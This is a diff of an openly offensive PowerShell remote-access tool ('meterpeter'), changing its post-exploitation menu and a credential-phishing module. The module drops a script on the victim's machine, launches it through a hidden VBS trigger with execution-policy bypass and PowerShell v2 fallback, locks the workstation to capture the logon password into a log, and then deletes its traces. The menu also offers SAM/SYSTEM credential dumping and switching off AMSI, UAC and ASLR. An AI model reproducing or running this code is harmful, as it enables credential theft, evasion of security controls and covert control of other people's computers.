@@ -848,7 +848,8 @@ While($Client.Connected)
       write-host "   GoogleX   Open Google Sphere(prank)       Open Remote Browser in google sphere";
       write-host "   LockPC    Lock Remote WorkStation         Lock Remote workstation (rundll32)";
       write-host "   SpeakPC   Make Remote-Host Speak          Input Frase for Remote-Host to Speak";
-      write-host "   AMSIset   Turn On/Off AMSI (reg)          Client:User OR Admin Priv Required";
+      write-host "   CredPhi   Promp User for logon creds      Client:User|Admin - Privs Required";
+      write-host "   AMSIset   Turn On/Off AMSI (reg)          Client:User|Admin - Privs Required";
       write-host "   UACSet    Turn On/Off remote UAC          Client:Admin - Privileges Required";
       write-host "   ASLRSet   Turn On/Off remote ASLR         Client:Admin - Privileges Required";
       write-host "   TaskMan   Turn On/off TaskManager         Client:Admin - Privileges Required";
@@ -856,7 +857,6 @@ While($Client.Connected)
       write-host "   DumpSAM   Dump SAM/SYSTEM Credentials     Client:Admin - Privileges Required";
       write-host "   Dnspoof   Hijack Entrys in hosts file     Client:Admin - Privileges Required";
       write-host "   NoDrive   Hide Drives from Explorer       Client:Admin - Privileges Required";
-      write-host "   CredPhi   Promp User for valid creds      Client:User|Admin - Privs Required";
       write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
       write-host "`n`n :meterpeter:Post> " -NoNewline -ForeGroundColor Green;
       $choise = Read-Host;      
@@ -1403,25 +1403,27 @@ While($Client.Connected)
         write-host " [sam|system|security] Remote Dump Directory: '`$env:tmp'" -ForeGroundColor yellow;write-host "`n`n";Start-Sleep -Seconds 2;
         $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){cmd /R reg save hklm\system system;cmd /R reg save hklm\sam sam;cmd /R reg save hklm\security security;dir `$env:tmp `> `$env:localappdata\dellog.txt;Get-content `$env:localappdata\dellog.txt;Remove-Item `$env:localappdata\dellog.txt -Force}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";       
       }
-      If($choise -eq "CredPhi" -or $choise -eq "credphi")
+      If($choise -eq "CredPhi" -or $choise -eq "Creds")
       {
         write-host "`n   Requirements" -ForegroundColor Yellow;
         write-host "   ------------";
-        write-host "   This Module will allow attacker to Lock Target workstation and request";
-        write-host "   a valid UserAccount password to UnLock it, while in background it stores ";
-        write-host "   the credentials into a remote logfile under `$env:tmp folder to later review.";
+        write-host "   This Module will allow attacker to Lock Target WorkStation and request";
+        write-host "   a valid UserAccount password to UnLock it, While in background it stores ";
+        write-host "   the credentials to a remote logfile under `$env:tmp folder for later review.";
         write-host "`n`n   Modules     Description                  Remark" -ForegroundColor green;
         write-host "   -------     -----------                  ------";
         write-host "   exploit     Phish for remote creds       Client:User|Admin - Privs required";
         write-host "   ReadLog     Read phishing logFile        Client:User  - Privileges required";
         write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow;
-        write-host "`n`n :meterpeter:Post:CredPhi> " -NoNewline -ForeGroundColor Green;
+        write-host "`n`n :meterpeter:Post:Creds> " -NoNewline -ForeGroundColor Green;
         $cred_choise = Read-Host;
-        If($cred_choise -eq "exploit" -or $cred_choise -eq "exploit")
+        If($cred_choise -eq "Exploit" -or $cred_choise -eq "exploit")
         {
           $name = "CredsPhish.ps1";
           $File = "$Bin$name"
-          write-host " Phishing for Remote Credentials (logon)" -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 2;
+          $timestamp = Get-date -DisplayHint Time;
+          write-host " Phishing for Remote Credentials (logon)" -ForegroundColor Blue -BackgroundColor White;
+          write-host " [$timestamp] Waiting for valid credentials .." -ForegroundColor Yellow;Start-Sleep -Seconds 2;
           If(([System.IO.File]::Exists("$File")))
           {
             ## Write Local script (CredsPhish.ps1) to Remote-Host $env:tmp
@@ -1430,7 +1432,6 @@ While($Client.Connected)
             $File = $File.Split('\')[-1];
             $File = $File.Split('/')[-1];
             ## Use powershell -version 2 in VBS trigger IF available
-            # check for v2: Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2
             $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 `> test.log;If(Get-Content test.log|Select-String `"Enabled`"){`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`"};echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\CredsPhish.vbs;echo 'objShell.Run `"cmd /R PoWeRsHeLl -version 2 -Exec Bypass -Win 1 -File %tmp%\CredsPhish.ps1`", 0, True' `>`> `$env:tmp\CredsPhish.vbs;remove-Item test.log -Force;cmd /R %tmp%\CredsPhish.vbs}else{`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`"};echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\CredsPhish.vbs;echo 'objShell.Run `"cmd /R PoWeRsHeLl -Exec Bypass -Win 1 -File %tmp%\CredsPhish.ps1`", 0, True' `>`> `$env:tmp\CredsPhish.vbs;remove-Item test.log -Force;cmd /R %tmp%\CredsPhish.vbs}}else{`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`"};echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\CredsPhish.vbs;echo 'objShell.Run `"cmd /R PoWeRsHeLl -Exec Bypass -Win 1 -File %tmp%\CredsPhish.ps1`", 0, True' `>`> `$env:tmp\CredsPhish.vbs;cmd /R %tmp%\CredsPhish.vbs}";
             $Command = $Command -replace "#","$File";
             $Command = $Command -replace "@","$FileBytes";
@@ -1448,7 +1449,7 @@ While($Client.Connected)
         If($cred_choise -eq "ReadLog" -or $cred_choise -eq "ReadLog")
         {
           write-host " Read Remote-Host Credential LogFile" -ForeGroundColor blue -BackGroundColor white;Start-Sleep -Seconds 1;write-host "`n";
-          $Command = "If(([System.IO.File]::Exists(`"`$env:tmp\CredsPhish.log`"))){Get-Content `$env:tmp\CredsPhish.log `> rtf.txt;Get-Content rtf.txt;Remove-Item rtf.txt -Force;Remove-Item `$env:tmp\CredsPhish.ps1 -Force;Remove-Item `$env:tmp\CredsPhish.log -Force}else{echo `"   [i] File: `$env:tmp\CredsPhish.log Not Found in Remote System`" `> rtf.txt;Get-Content rtf.txt;Remove-Item rtf.txt -Force;Remove-Item `$env:tmp\CredsPhish.ps1 -Force}";
+          $Command = "If(([System.IO.File]::Exists(`"`$env:tmp\CredsPhish.log`"))){Get-Content `$env:tmp\CredsPhish.log `> rtf.txt;Get-Content rtf.txt;Remove-Item rtf.txt -Force;Remove-Item `$env:tmp\CredsPhish.ps1 -Force;Remove-Item `$env:tmp\CredsPhish.log -Force;Remove-Item `$env:tmp\CredsPhish.vbs -Force}else{echo `"   [i] Not Found: `$env:tmp\CredsPhish.log`" `> rtf.txt;Get-Content rtf.txt;Remove-Item rtf.txt -Force;Remove-Item `$env:tmp\CredsPhish.ps1 -Force;Remove-Item `$env:tmp\CredsPhish.log -Force;Remove-Item `$env:tmp\CredsPhish.vbs -Force}";
         }
         If($cred_choise -eq "Return" -or $cred_choise -eq "return" -or $cred_choise -eq "cls" -or $cred_choise -eq "Modules" -or $cred_choise -eq "modules" -or $cred_choise -eq "clear")
         {
